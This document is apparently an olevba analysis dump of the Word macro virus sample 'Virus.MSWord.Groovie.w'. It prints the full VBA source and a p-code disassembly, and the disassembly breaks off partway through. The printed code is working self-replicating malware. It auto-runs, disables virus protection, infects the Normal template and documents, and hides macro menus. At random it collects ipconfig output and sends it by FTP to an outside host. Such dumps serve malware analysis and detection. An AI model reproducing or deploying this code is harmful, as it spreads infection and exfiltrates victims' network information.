olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.w
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.w - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberHack.bas 
in file: Virus.MSWord.Groovie.w - OLE stream: 'Macros/VBA/CyberHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberForm.frm 
in file: Virus.MSWord.Groovie.w - OLE stream: 'Macros/VBA/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































































































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.w - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public DataDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public HoldDoc As String
Public DocThere As Boolean
Public Final_Close_Called As Boolean
Public rn As Variant

Function ID_Status()
On Error Resume Next
    If MacroContainer = NormalTemplate Then
        WhoAmI = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then WhoAmI = "document"
    If MacroContainer = "data.dot" Then WhoAmI = "orbit"
checkout:
End Function
Function Install_Status()
Dim i As Variant

On Error Resume Next
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then DataDot = True
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then DocInstalled = True
    Next i
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then NormInstalled = True
    Next i
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
    GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function
Function The_Groovie_Core()
On Error Resume Next
Call ID_Status
Call Install_Status
    If WhoAmI = "document" Then Call DocCodeCore
    If WhoAmI = "normal" Then Call NormCodeCore
    If WhoAmI = "orbit" Then Call OrbitCoreCode
    If NormReadOnly = False Then CommandBars("tools").Controls("Macro").Delete
    If NormReadOnly = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function DocCodeCore()
On Error Resume Next
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
    If NormInstalled = False And NormReadOnly = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
    End If
    If DataDot = False Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Shell ("label c: groovie"), 0
        Windows(1).Close
    End If
End Function
Function NormCodeCore()
On Error Resume Next
Application.ScreenUpdating = False
    Call Check_For_Doc
    If DocInstalled = False And DocThere = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "ALT-F11 says it's groovie!"
            .Execute
        End With
    End If
    If DataDot = False And DocThere = True Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If DataDot = False And DocThere = False Then
        Documents.Add Template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function OrbitCoreCode()
On Error Resume Next
Application.ScreenUpdating = False
        If NormInstalled = False And NormReadOnly = False Then
            With NormalTemplate.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If DocInstalled = False Then
            With ActiveDocument.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            With Dialogs(wdDialogFileSummaryInfo)
                .Comments = "ALT-F11 says it's groovie!"
                .Execute
            End With
        End If
Application.ScreenUpdating = True
End Function
Function Groovie_Run()
On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    HoldDoc = ActiveDocument.FullName
    Call The_Groovie_Core
    Randomize
    rn = Int(Rnd * 5)
    If rn = 3 Then Call IP_Love_You
End Function
Sub AutoOpen()
On Error Resume Next
Call Groovie_Run
End Sub
Sub AutoClose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub AutoExit()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
On Error Resume Next
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub fileclose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub
Sub fileprint()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFilePrint).Show
End Sub
Function IP_Love_You()
On Error Resume Next
    Shell ("ipconfig /all /batch c:\ip.txt"), 0
    Call mscript("c:\script.sys")
    Shell ("ftp -s:c:\script.sys complex.is"), 0
End Function
Function mscript(strFile As String)
Randomize
On Error Resume Next
    one = Application.UserName
    two = Application.UserInitials
    rn = Int(Rnd * 999)
    Dim hFile As Long
    hFile = FreeFile
Open strFile For Output Access Write As hFile
    Print #hFile, "anonymous"
    Print #hFile, one & "@" & two & ".com"
    Print #hFile, "cd incoming"
    Print #hFile, "send"
    Print #hFile, "c:\ip.txt"
    Print #hFile, rn + rn & "." & two
    Print #hFile, "quit"
Close hFile
End Function
Sub viewvbcode()
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        DocThere = True
    End If
    GoTo over
docek:
    DocThere = False
over:
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Groovie.w
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1215 bytes
' Macros/VBA/CyberHack - 696 bytes
' Macros/VBA/CyberForm - 2437 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #96:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #97:
' 	EndSub 
' Macros/VBA/groovie - 19790 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn WhoAmI (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn DataDot (As Boolean)
' Line #2:
' 	Dim (Public) 
' 	VarDefn NormInstalled (As Boolean)
' Line #3:
' 	Dim (Public) 
' 	VarDefn DocInstalled (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn NormReadOnly (As Boolean)
' Line #5:
' 	Dim (Public) 
' 	VarDefn HoldDoc (As String)
' Line #6:
' 	Dim (Public) 
' 	VarDefn DocThere (As Boolean)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Final_Close_Called (As Boolean)
' Line #8:
' 	Dim (Public) 
' 	VarDefn rn (As Variant)
' Line #9:
' Line #10:
' 	FuncDefn (Function ID_Status())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0006 "normal"
' 	St WhoAmI 
' Line #14:
' 	GoTo checkout 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "document"
' 	St WhoAmI 
' 	EndIf 
' Line #17:
' 	Ld MacroContainer 
' 	LitStr 0x0008 "data.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "orbit"
' 	St WhoAmI 
' 	EndIf 
' Line #18:
' 	Label checkout 
' Line #19:
' 	EndFunc 
' Line #20:
' 	FuncDefn (Function Install_Status())
' Line #21:
' 	Dim 
' 	VarDefn i (As Variant)
' Line #22:
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0008 "data.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DataDot 
' 	EndIf 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "groovie"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocInstalled 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #29:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "groovie"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ld vbReadOnly 
' 	Add 
' 	Eq 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormReadOnly 
' 	EndIf 
' Line #32:
' 	EndFunc 
' Line #33:
' 	FuncDefn (Function The_Groovie_Core())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	ArgsCall (Call) ID_Status 0x0000 
' Line #36:
' 	ArgsCall (Call) Install_Status 0x0000 
' Line #37:
' 	Ld WhoAmI 
' 	LitStr 0x0008 "document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) DocCodeCore 0x0000 
' 	EndIf 
' Line #38:
' 	Ld WhoAmI 
' 	LitStr 0x0006 "normal"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) NormCodeCore 0x0000 
' 	EndIf 
' Line #39:
' 	Ld WhoAmI 
' 	LitStr 0x0005 "orbit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) OrbitCoreCode 0x0000 
' 	EndIf 
' Line #40:
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #41:
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #42:
' 	EndFunc 
' Line #43:
' 	FuncDefn (Function DocCodeCore())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	LitStr 0x000E "c:\groovie.sys"
' 	LitStr 0x0007 "groovie"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #46:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #47:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #48:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #49:
' 	EndWith 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld DataDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #54:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #55:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	Ld Final_Close_Called 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HoldDoc 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #58:
' 	LitStr 0x0010 "label c: groovie"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #59:
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndFunc 
' Line #62:
' 	FuncDefn (Function NormCodeCore())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #65:
' 	ArgsCall (Call) Check_For_Doc 0x0000 
' Line #66:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld DocThere 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #67:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #68:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #69:
' 	EndWith 
' Line #70:
' 	EndWith 
' Line #71:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #72:
' 	LitStr 0x001A "ALT-F11 says it's groovie!"
' 	MemStWith Comments 
' Line #73:
' 	ArgsMemCallWith Execute 0x0000 
' Line #74:
' 	EndWith 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld DataDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld DocThere 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #77:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #78:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #79:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #80:
' 	Ld Final_Close_Called 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HoldDoc 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #81:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld DataDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld DocThere 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #84:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #85:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #86:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #87:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #88:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #89:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #92:
' 	EndFunc 
' Line #93:
' 	FuncDefn (Function OrbitCoreCode())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #96:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #97:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #98:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #99:
' 	EndWith 
' Line #100:
' 	EndWith 
' Line #101:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #104:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #105:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #106:
' 	EndWith 
' Line #107:
' 	EndWith 
' Line #108:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #109:
' 	LitStr 0x001A "ALT-F11 says it's groovie!"
' 	MemStWith Comments 
' Line #110:
' 	ArgsMemCallWith Execute 0x0000 
' Line #111:
' 	EndWith 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #114:
' 	EndFunc 
' Line #115:
' 	FuncDefn (Function Groovie_Run())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #119:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #120:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St HoldDoc 
' Line #121:
' 	ArgsCall (Call) The_Groovie_Core 0x0000 
' Line #122:
' 	ArgsCall Read 0x0000 
' Line #123:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	St rn 
' Line #124:
' 	Ld rn 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) IP_Love_You 0x0000 
' 	EndIf 
' Line #125:
' 	EndFunc 
' Line #126:
' 	FuncDefn (Sub AutoOpen())
' Line #127:
' 	OnError (Resume Next) 
' Line #128:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #129:
' 	EndSub 
' Line #130:
' 	FuncDefn (Sub AutoClose())
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	LitVarSpecial (True)
' 	St Final_Close_Called 
' Line #133:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub AutoExit())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	LitVarSpecial (True)
' 	St Final_Close_Called 
' Line #138:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FileSaveAs())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #143:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub filesave())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #148:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub fileclose())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	LitVarSpecial (True)
' 	St Final_Close_Called 
' Line #153:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #154:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #155:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub fileprint())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	ArgsCall (Call) Groovie_Run 0x0000 
' Line #160:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Function IP_Love_You())
' Line #163:
' 	OnError (Resume Next) 
' Line #164:
' 	LitStr 0x001E "ipconfig /all /batch c:\ip.txt"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #165:
' 	LitStr 0x000D "c:\script.sys"
' 	ArgsCall (Call) mscript 0x0001 
' Line #166:
' 	LitStr 0x001F "ftp -s:c:\script.sys complex.is"
' 	Paren 
' 	LitDI2 0x0000 
